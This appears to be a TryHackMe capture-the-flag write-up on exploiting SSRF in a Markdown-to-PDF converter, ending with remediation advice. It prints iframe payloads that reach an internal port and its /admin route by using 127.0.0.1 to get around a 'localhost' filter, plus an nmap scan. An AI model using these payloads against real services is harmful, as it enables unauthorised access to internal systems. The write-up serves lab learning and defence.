# MD2PDF — TryHackMe Writeup

**Difficulty:** Easy
**Category:** Web
**Vulnerability:** Server-Side Request Forgery (SSRF)

---

## Overview

MD2PDF is a Markdown-to-PDF converter that renders HTML before generating the output file. Because it uses a headless browser internally, it's possible to inject HTML that forces the server to make requests on our behalf — a classic SSRF scenario.

---

## Reconnaissance

The application accepts Markdown input and converts it to a PDF. Testing with basic HTML tags confirmed that the converter renders raw HTML, not just Markdown.

The server filtered the word `localhost`, returning a `Bad Request` error when it appeared in the input.

---

## Exploitation

### Step 1 — Confirming SSRF

Injecting an iframe pointing to the server's own IP confirmed the SSRF:

```html
<iframe src="http://<TARGET_IP>" width="1000" height="1000"></iframe>
```

The generated PDF rendered the application's own homepage inside the iframe.

### Step 2 — Discovering Internal Services

Running Nmap against the target revealed an additional open port:

```bash
nmap <TARGET_IP> -T5
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
```

Port **5000** was accessible internally but not from the outside.

### Step 3 — Accessing the Internal Service

```html
<iframe src="http://127.0.0.1:5000" width="1000" height="1000"></iframe>
```

The PDF showed another instance of the MD2PDF application running internally.

### Step 4 — Retrieving the Flag

```html
<iframe src="http://127.0.0.1:5000/admin" width="1000" height="1000"></iframe>
```

The `/admin` route of the internal service returned the flag.

---

## Key Takeaways

- **SSRF** allows an attacker to make the server perform HTTP requests to internal resources that are otherwise inaccessible from the outside.
- Filtering `localhost` is insufficient — `127.0.0.1` or other bypass techniques can be used instead.
- Always restrict what URLs a server-side request can reach using allowlists, not blocklists.

---

## Vulnerability Summary

| Field | Detail |
|-------|--------|
| Type | Server-Side Request Forgery (SSRF) |
| Vector | HTML injection via Markdown input |
| Impact | Access to internal services on port 5000 |
| Fix | Allowlist permitted URL schemes and destinations; block requests to internal IP ranges |
